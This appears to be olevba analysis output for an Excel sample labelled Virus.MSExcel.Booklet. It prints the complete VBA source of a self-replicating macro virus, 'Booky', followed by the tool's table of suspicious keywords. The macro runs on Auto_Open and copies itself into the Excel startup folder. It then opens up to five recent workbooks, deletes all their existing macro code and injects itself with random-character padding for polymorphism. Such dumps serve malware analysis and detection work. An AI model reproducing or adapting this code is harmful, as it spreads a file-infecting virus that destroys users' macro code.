olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Booklet-58dd0da7517352d279f489c956d501996d22ab19
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO booky.bas 
in file: Virus.MSExcel.Booklet-58dd0da7517352d279f489c956d501996d22ab19 - OLE stream: '_VBA_PROJECT_CUR/VBA/booky'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
'Primul meu virus de ExCeL (semi polymorfic)
'CoDeNaMe: XL/ Booky
'
'Full comment:
'verifica daca e infect. PC-ul
On Error Resume Next
If Application.UserName <> "booky" Then
Application.UserName = "booky"
'daca nu, infecteaza PC-ul
ActiveWorkbook.SaveAs FileName:=Application.StartupPath + "\Booky.xls", FileFormat:=xlNormal, Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
StatusBar = "BookY RuLz Hir...Hehehe"
End If
'Infecteaza 5 fisiere recente daca nu au fost deja inf.
Dim inf, nr, ln, xxx, poly, a, modul
'Verifica care e modulul original
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "booky" Then modul = i
Next i
For i = 1 To Application.RecentFiles.Count
'deschide fis. daca nu e deja deschis
If nr >= 5 Then i = Application.RecentFiles.Count
If Application.RecentFiles(i).Path <> ThisWorkbook.Path + "\" + ThisWorkbook.Name Then Workbooks.Open FileName:=Application.RecentFiles(i).Path
inf = 0
'gaseste codul virusului in ce modul e
For n = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(n).Name = "booky" Then inf = inf + 1
Next n
If inf > 0 Then ActiveWorkbook.Close
If inf = 0 Then
nr = nr + 1
ActiveWorkbook.VBProject.VBComponents.Add vbext_ct_StdModule
'inf. toate modulele si creeaza unul nou, just in case!
For a = 1 To ActiveWorkbook.VBProject.VBComponents.Count
ActiveWorkbook.VBProject.VBComponents.Item(a).CodeModule.DeleteLines 1, ActiveWorkbook.VBProject.VBComponents.Item(a).CodeModule.CountOfLines
'copiaza codul virusului + ceva polymorf. (random chars)
For ln = 1 To ThisWorkbook.VBProject.VBComponents(modul).CodeModule.CountOfLines
xxx = ThisWorkbook.VBProject.VBComponents(modul).CodeModule.Lines(ln, 1)
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strn = xxx + " '" + poly
ActiveWorkbook.VBProject.VBComponents.Item(a).CodeModule.InsertLines ln, strn
Next ln
Next a
'da numele noului modul ="booky" (sa stie ca l-a infectat)
ActiveWorkbook.VBProject.VBComponents(ActiveWorkbook.VBProject.VBComponents.Count).Name = "booky"
'salveaza si inchide fis.
ActiveWorkbook.Save
ActiveWorkbook.Close
End If
Next i
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Booklet-58dd0da7517352d279f489c956d501996d22ab19 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Booklet-58dd0da7517352d279f489c956d501996d22ab19 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Booklet-58dd0da7517352d279f489c956d501996d22ab19 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Booklet-58dd0da7517352d279f489c956d501996d22ab19 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

